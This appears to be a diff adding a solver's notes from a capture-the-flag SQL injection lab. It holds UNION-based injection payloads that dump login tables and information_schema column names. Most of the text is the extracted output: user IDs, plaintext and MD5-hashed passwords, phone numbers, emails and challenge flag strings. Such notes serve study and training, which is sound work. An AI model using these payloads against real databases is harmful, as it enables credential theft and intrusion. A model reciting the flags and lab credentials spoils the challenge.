@@ -1,0 +1,51 @@
+segFault_sqli
+
+book_info -> book_idx, title, author, date, category, price, score
+1	???? ????	???	2021-11-12		?? ??		20000	2
+2	?? ??? ??	???	2020-04-03		???		12000	3
+3	? ??? ??	???	2018-05-05		????		13000	4
+4	???		???	2011-11-11		???		9000		NULL
+
+flag_table -> flag
+segfault{byPassWithSQLi}
+segfault{FilterWhat?!}
+segfault{UniUniONONON}
+segfault{H4shBrown}
+segfault{C00kiesYummy}
+segfault{secretMagic!}
+segfault{No_System_Is_Safe}
+
+
+
+doldol' union select pass, '2' from login1 limit 1,1#
+login1 -> id, pass, name, phone, email, user_type
+1ogin_acc		vr9eif9wi			login_acc		010-3333-2222		test@twes.com			user
+5ecret_acc0unt	gjijfweijfiqwh38h		secret_acc		010-1313-1313		test@test.com			admin
+bello			prettycute			bello			010-2222-4455		bello@normaltic.com		flag
+doldol		dol1234			doldol		010-2222-3333		dol@dol.com			NULL
+mario			mariosuper			mario			010-3434-1111		mario@normaltic.com		NULL
+normaltic		hardpassword1018	normaltic		010-1111-2222		normaltic@normaltic.com	NULL
+normaltic1		kobooekf			normaltic1		NULL				sdfsdf@fdsf.com			NULL
+normaltic2		brjgirjeigjweij		normaltic2		NULL				NULL					NULL
+normaltic3		tmhokjowejf3fdwd	normaltic3		NULL				NULL					NULL
+normaltic4		oieoeonvijed		normaltic4		NULL				NULL					NULL
+normaltic5		tiiiewkfowekfo		normaltic5		NULL				NULL					NULL
+
+
+doldol' union select pass, '2' from login2 limit 1,1#
+login2 -> id, pass, name, phone, email, user_type
+doldol		fe350b2ff979b0e0ea1844ed644ecafe	doldol	010-3333-4444	dol@dol.com			user
+hidden_account	83fb5d15cb92720d5410974fe2140390	Secret	010-3333-2222	secret@secret.com		Super
+mario			66566cbac5673baf9217ccf7fcfa3d15		mario		010-3434-1111	mario@normaltic.com		admin
+normaltic		098F6BCD4621D373CADE4E832627B4F6	normaltic	010-1111-2222	sdfdsf@normaltic.com		NULL
+normaltic4		fe350b2ff979b0e0ea1844ed644ecafe	normaltic4	NULL			normaltic@normaltic.com	NULL
+
+doldol' union select password, '2' from user_info limit 1,1#
+user_info -> id, name, password, level, rank_point, rate
+ACoffee	MorningCoffee	97dhuueokkd!@	33	2100		35
+bello		MiniBello		marioLove		93	5200		98
+mario		marioCandy	Candy8282		23	1700		4
+normaltic	SuperNormaltic	normal12345	75	3200		89
+
+
+doldol' union select column_name,'222' from information_schema.columns where table_name = 'login1' limit 1,1#
